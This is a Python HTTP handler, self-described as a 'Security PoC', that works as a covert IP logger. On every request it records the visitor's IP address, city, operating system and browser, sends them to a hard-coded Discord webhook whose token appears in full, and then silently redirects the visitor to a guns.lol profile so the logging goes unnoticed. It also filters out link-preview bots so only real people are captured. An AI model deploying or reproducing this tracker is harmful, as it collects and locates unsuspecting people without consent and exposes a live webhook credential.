from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, os

# CONFIGURATION
config = {
    "webhook": "https://discord.com/api/webhooks/1398395847426965635/ditq3Fl-yHzNDAZ51uhdYUnMIZT0C7jsn96amb3gz01cPi5M3edR5iUN2b-7LliHjrKj",
    "username": "Guns.lol Monitor",
    "color": 0x00FFFF,
    "vpnCheck": 1, 
    "antiBot": 1,
    "redirect": {
        "redirect": True,
        "page": "https://guns.lol/sleezyyyyyy" 
    }
}

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")): return "Discord"
    return "Telegram" if useragent.startswith("TelegramBot") else False

def makeReport(ip, useragent, endpoint="N/A"):
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os_info, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "Security PoC - IP Logged",
            "color": config["color"],
            "description": f"**IP:** `{ip}`\n**City:** `{info.get('city', 'Unknown')}`\n**OS:** `{os_info}`\n**Browser:** `{browser}`"
        }]
    }
    requests.post(config["webhook"], json=embed)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        ua = self.headers.get('user-agent', 'Unknown')
        
        # Log the data
        makeReport(ip, ua, endpoint=s)
        
        # Perform the Redirect
        self.send_response(302)
        self.send_header('Location', config["redirect"]["page"])
        self.end_headers()
